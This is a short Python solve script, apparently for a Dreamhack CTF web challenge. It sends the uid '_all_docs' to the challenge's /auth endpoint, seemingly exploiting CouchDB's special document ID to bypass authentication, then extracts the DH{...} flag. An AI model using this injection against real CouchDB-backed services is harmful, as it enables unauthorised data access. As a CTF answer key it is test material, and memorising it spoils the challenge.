import requests
import re

URL = "http://host3.dreamhack.games:18295"

res = requests.post(URL+"/auth", json={"uid": "_all_docs"})
match = re.search(r'DH\{[^}]*\}', res.text)

print(match.group(0))
